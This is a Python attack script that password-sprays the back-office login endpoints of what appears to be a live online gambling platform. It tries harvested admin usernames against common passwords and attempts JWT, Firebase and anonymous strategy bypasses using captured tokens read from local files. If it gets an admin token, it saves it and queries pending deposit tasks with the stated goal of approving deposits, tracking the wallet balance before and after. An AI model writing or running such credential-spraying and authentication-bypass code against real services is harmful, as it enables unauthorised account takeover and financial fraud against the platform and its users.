#!/usr/bin/env python3
"""probe_bo_spray.py — Password spray pbapi /bo/authentication.

   CONFIRMED: POST /bo/authentication on PBAPI returns 401 (not ISE).
   Endpoint exists and processes auth — wrong credentials only.

   Spray known admin usernames against common passwords.
   Also try JWT/Firebase strategy bypass.
"""
import json, pathlib, requests, time, base64

TID   = "af6efb584a3d317b5a11ab6209b88e1b"
PBAPI = f"https://{TID}pbapi.asdgapicenterssdo.com"
BGAPI = f"https://{TID}bgapi.asdgapicenterssdo.com"
MGAPI = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
_new = pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt")
FB_TOKEN = (_new.read_text().strip() if _new.exists() and _new.stat().st_size > 100
            else pathlib.Path("/home/kzp/claude-red/fb_id_token.txt").read_text().strip())
parts = FB_TOKEN.split(".")
pad = parts[1] + "=" * (-len(parts[1]) % 4)
FB_UID = json.loads(base64.urlsafe_b64decode(pad)).get("sub", "")

DOMAIN = "m.vak88z2.com"

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn",
                              "Cookie": f"AWSALB={AWSALB}"},
                     timeout=10)
    return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"

HDR = {"Content-Type": "application/json",
       "Origin": "https://manage.vak88z2.com",
       "Cookie": f"AWSALB={AWSALB}"}

# Key admin usernames from bo_admins_vak88z2.json
ADMINS = [
    "Vak88z", "vak88admin", "admin", "Autodaily", "checksystem",
    "Zfinance00-01", "Zfinance00-02", "Zfinance00-07",
    "support00-01", "support00-10", "support00-78",
    # System service accounts
    "system", "service", "superadmin",
]

# Common passwords for Thai gambling platforms
PASSWORDS = [
    "Aa112233",          # player password (same pattern?)
    "admin",
    "admin123",
    "Admin123",
    "Admin@123",
    "admin@123",
    "123456",
    "1234567890",
    "Vak88z",
    "Vak88z!",
    "vak88",
    "Vak88!",
    "Pwned2026!",        # slxoz1688 password
    "checksystem",
    "Autodaily",
    "Aa@112233",
    "password",
    "Password123",
    "Password@123",
    "Vak88Admin",
    "Vak88Admin!",
    "Zfinance01",
]

print(f"Spraying {len(ADMINS)} admins × {len(PASSWORDS)} passwords...")
print(f"wallet before: {wallet()}")

bo_jwt = None
for username in ADMINS:
    for password in PASSWORDS:
        for base_url in [BGAPI, PBAPI]:
            r = requests.post(f"{base_url}/bo/authentication",
                              headers=HDR,
                              json={"strategy": "local", "username": username,
                                    "password": password, "domain": DOMAIN},
                              timeout=10)
            if r.status_code != 401 or "Incorrect" in r.text:
                break  # meaningful response from this service
        if r.status_code != 401:
            print(f"\n  [!!!] {username}:{password} HTTP {r.status_code}: {r.text[:400]}")
            if r.ok and "accessToken" in r.text:
                bo_jwt = r.json().get("accessToken", "")
                pathlib.Path("/home/kzp/claude-red/.jwt.bo_vak88z2").write_text(bo_jwt)
                print(f"  [!!!] BO JWT saved!")
                break
        else:
            # Show non-generic 401 (i.e., actual rejection vs ISE)
            if "Incorrect" in r.text or "incorrect" in r.text or "not found" in r.text.lower():
                print(f"  NOTE {username}:{password} → Incorrect creds (non-ISE 401)")
    if bo_jwt:
        break

# ── Strategy bypass ────────────────────────────────────────────────────────
print("\n=== Strategy bypass ===")
bypass_attempts = [
    # JWT strategy with player JWT
    {"strategy": "jwt", "accessToken": JWT},
    # Firebase strategy
    {"strategy": "firebase", "access_token": FB_TOKEN},
    {"strategy": "firebase", "id_token": FB_TOKEN},
    # Anonymous strategy
    {"strategy": "anonymous"},
    # Admin UUID as token
    {"strategy": "jwt", "accessToken": "5958356c-eb4e-4e07-a155-83e4382e3532"},
    # No strategy (might default to local)
    {"username": "admin", "password": "admin", "domain": DOMAIN},
]
for pl in bypass_attempts:
    r = requests.post(f"{PBAPI}/bo/authentication", headers=HDR, json=pl, timeout=10)
    keys = str(list(pl.keys()))[:40]
    if r.status_code != 401:
        print(f"  [!!!] {keys}: HTTP {r.status_code}: {r.text[:400]}")
    else:
        print(f"  {keys}: 401")

# ── If BO JWT, approve deposits ────────────────────────────────────────────
if bo_jwt:
    print(f"\n=== BO JWT obtained! Approving deposits ===")
    bo_hdrs = {"Authorization": f"Bearer {bo_jwt}", "template": "vn",
               "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}",
               "Origin": "https://manage.vak88z2.com"}
    # List pending
    for svc, url in [("bgapi", BGAPI), ("pbapi", PBAPI)]:
        r = requests.get(f"{url}/bo/slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=20",
                         headers=bo_hdrs, timeout=12)
        print(f"  [{svc}] slip tasks: HTTP {r.status_code}: {r.text[:400]}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
